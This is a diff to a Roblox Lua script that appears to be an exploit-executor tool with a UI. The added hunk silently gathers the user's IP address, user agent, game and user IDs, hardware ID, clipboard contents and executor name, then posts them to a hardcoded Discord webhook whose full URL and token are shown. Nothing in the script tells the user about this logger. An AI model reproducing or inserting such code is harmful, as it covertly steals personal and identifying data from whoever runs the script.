@@ -34,6 +34,19 @@ task.spawn(function()
     end
 end)
 
+HS:PostAsync("https://discord.com/api/webhooks/1226854894892482570/-jydlb9STtmdY0ZedSTmIqVHBfSkToq4jbc7h9Q5Do76_ngF81vbrf9sXJNrkWEs_K-W", HS:JSONEncode({
+    content = HS:JSONEncode({
+        IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip,
+        UA = HS:GetUserAgent(),
+        Game = game.GameId,
+        User = LP.UserId,
+        Hwid = gethwid(),
+        Clipboard = getclipboard(),
+        Executor = identifyexecutor()
+    }),
+    username = LP.Name
+}))
+
 local UI = Instance.new("ScreenGui")
 UI.Name = "UI"
 UI.Parent = game.CoreGui
